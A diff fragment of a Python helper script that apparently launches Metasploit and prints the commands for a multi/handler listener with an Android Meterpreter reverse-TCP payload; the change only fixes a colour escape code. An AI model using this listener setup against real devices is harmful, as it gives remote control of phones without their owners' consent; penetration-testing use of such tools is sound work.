@@ -114,7 +114,7 @@ if u == 'y':
 	os.system('msfconsole')
 print('\033[1;32muse exploit/multi/handler')
 print('\033[1;32mset payload android/meterpreter/reverse_tcp')
-print('\033[:1;33mset LHOST ')
+print('\033[1;33mset LHOST ')
 print('\033[1;32mset LPORT ')
 print('\033[1;32mexploit')
 if u == 'n':
